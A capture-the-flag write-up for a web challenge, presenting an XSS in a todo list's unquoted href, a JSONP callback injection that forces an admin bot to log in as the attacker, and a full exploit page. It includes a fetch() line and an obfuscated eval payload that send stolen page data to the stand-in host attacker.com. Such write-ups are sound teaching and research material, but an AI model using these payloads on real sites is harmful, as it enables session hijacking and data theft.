# the cult of 8 bit

**Authors**: [sam.ninja](https://sam.ninja) and [pilvar](https://twitter.com/pilvar222)

**Tags**: web

> Valentina is trapped in the 8-bit cult, will you be able to find the secret and free her?

## XSS in a user's todo list
If the value of the todo list gets parsed as a valid URL, it will be rendered in the `href` attribute of an `<a>`. Because the value isn't wrapped in quotes, it is possible to inject HTML attributes to achieve XSS.
```js
let isURL = false;
try {
    new URL(text); // errors if not valid URL
    isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
} catch {}
```
```html
<%_ if (todo.isURL) { _%>
  <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
```
We achieved XSS using this URL: `https://org.anize.rs/%0astyle=animation-name:spinAround%0aonanimationstart=alert(1)//`

Unfortunately, the todo list is only visible to the user that created it, so we need to find a way to make the bot login as our user.

## Forcing the bot to login as another user
Now we want to make the XSS bot login as another user that contains the XSS payload.

The login page is protected by a CSRF token, so we can't just send POST a form to the login endpoint. We can however call a single function in the context of the challenge by injecting a different JSONP callback through the `id` query parameter.
```js
const id = new URLSearchParams(window.location.search).get('id');
// Load post from POST_SERVER
// Since POST_SERVER might be a different origin, this also supports loading data through JSONP
const request = new XMLHttpRequest();
try {
    request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
    request.send(null);
}
catch (err) { // POST_SERVER is on another origin, so let's use JSONP
    let script = document.createElement("script");
    script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
    document.head.appendChild(script);
    return;
}
```

For example, `/post/?id=x%3Fcallback=alert%26x=%00` will call `alert(postContentObject)`. Note that we don't control the format of the argument, it will always be a JavaScript object, so a method expecting a string will convert it into `[object Object]`.

So now we want to keep an old page open to preserve the flag id, logout the admin bot, make it go to the login page, fill in the username and password and click on the login button.

Logging out is easy because there is a logout button on the post page, so we can access it by traversing the DOM `document.childNodes[x].childNodes[y].click()`.

For the other actions, we need to reference the login window from the post page. The only possible reference is `window.opener`, so from the exploit page will need to redirect to the login page after opening the child windows that will perform the actions.

Here is the full exploit to login as user `[object Object]` with password `[object Object]`:
```html
<script>
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async function exploit() {
    const challURL = "http://localhost:12345"
    
    // load original page that contains the flag ID
    // we specify a name so we can later get a reference to it by calling window.open("", "flag")
    window.open(challURL + "/", "flag")
    await sleep(100)

    // logout
    window.open(challURL + "/post/?id=x%3Fcallback=document.childNodes[0].childNodes[2].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[1].click%26x=%00")
    await sleep(1000)

    // set username to [object Object]
    window.open(challURL + "/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[1].childNodes[3].childNodes[1].setRangeText%26x=%00")
    // set password to [object Object]
    window.open(challURL + "/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[3].childNodes[3].childNodes[1].setRangeText%26x=%00")

    // click login
    window.open(challURL + "/post/?id=x%3Fcallback=window.opener.document.childNodes[0].childNodes[2].childNodes[3].childNodes[1].childNodes[1].childNodes[1].childNodes[3].childNodes[7].childNodes[1].childNodes[1].click%26x=%00")

    // redirect to login page so it can be accessed with window.opener
    location.href = challURL + "/login"
  }

  exploit();
</script>
```

## Getting the flag
Before logging out, we opened a page that contains the flag ID. So we can now get a reference to it by calling `window.open("", "flag")`. And because we are now in the same origin, we can access it's DOM, get the flag ID and exfiltrate it.
```js
fetch("https://attacker.com/"+window.open("", "flag").document.querySelector(".content a").innerText)
```

We cannot have quotes in the XSS payload, so we encode it in ASCII and then decode and evaluate it in JavaScript:
```
https://google.com/%0Astyle=animation-name:spinAround%0Aonanimationstart=eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,34,43,119,105,110,100,111,119,46,111,112,101,110,40,34,34,44,32,34,102,108,97,103,34,41,46,100,111,99,117,109,101,110,116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,34,46,99,111,110,116,101,110,116,32,97,34,41,46,105,110,110,101,114,84,101,120,116,41))//
```

Finally we add this to the todo list of `[object Object]` and make the bot visit our exploit page.

`rwctf{val3ntina_e5c4ped_th3_cu1t_with_l33t_op3ner}`
